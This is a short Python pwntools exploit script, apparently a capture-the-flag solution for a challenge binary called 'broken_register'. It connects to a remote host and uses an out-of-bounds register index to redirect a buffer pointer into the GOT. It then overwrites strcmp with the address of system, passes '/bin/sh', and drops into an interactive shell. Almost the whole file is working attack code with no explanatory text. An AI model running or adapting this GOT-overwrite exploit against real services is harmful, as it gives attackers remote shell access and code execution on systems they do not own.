from pwn import *

context(
    terminal = ['urxvt', '--hold', '-e', 'bash', '-c']
)

'''
undefined num_storage()
     int[8]            Stack[-0x2c]   registers                               XREF[2]:     080492d7(*),
     char *            Stack[-0x44]:4 buf                                     XREF[8]:     080492a8(W),
'''

# p = process('./broken_register')

p = remote('165.22.73.179', 707)

system = 0x80490a0
got_atoi = 0x804c030
got_strcmp = 0x0804c020

# overwrite buf pointer

stack_buf  = -0x44
stack_regs = -0x2c

offset = stack_buf - stack_regs

reg = offset / 4

print reg

if False:
    gdb.attach(p, '''
        b getline
        c
    ''')

p.sendline(str(reg))
p.sendline(str(got_strcmp - 8))

# overwrite GOT with system

p.sendline('/bin/sh\x00' + p32(system))

p.interactive()



